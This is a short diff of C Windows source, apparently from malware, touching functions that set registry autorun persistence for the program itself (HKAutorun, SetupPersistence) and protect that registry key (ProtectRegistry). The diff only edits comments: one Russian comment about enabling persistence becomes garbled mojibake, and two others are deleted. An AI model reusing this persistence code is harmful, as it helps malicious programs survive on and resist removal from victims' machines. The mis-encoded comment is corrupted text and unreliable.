@@ -140,7 +140,7 @@ BOOL HKAutorun(LPWSTR pSelf)
 		{
 			bRet = TRUE;
 
-			SetupPersistence(szRandomString, bHKLM, pSelf); // врубить персистенс, см. описание около самой функции
+			SetupPersistence(szRandomString, bHKLM, pSelf); // ГўГ°ГіГЎГЁГІГј ГЇГҐГ°Г±ГЁГ±ГІГҐГ­Г±, Г±Г¬. Г®ГЇГЁГ±Г Г­ГЁГҐ Г®ГЄГ®Г«Г® Г±Г Г¬Г®Г© ГґГіГ­ГЄГ¶ГЁГЁ
 
 		}
 		RegCloseKey(hKey);
@@ -154,9 +154,9 @@ BOOL HKAutorun(LPWSTR pSelf)
 
 struct PersistenceInformation
 {
-	WCHAR pKeyName[256]; // имя ключа
+	WCHAR pKeyName[256]; 
 	WCHAR pSelf[256];
-	BOOL bHKLM; // защищать HKLM или нет ( HKCU )
+	BOOL bHKLM; 
 };
 
 DWORD WINAPI ProtectRegistry(PersistenceInformation *lpPersistence)
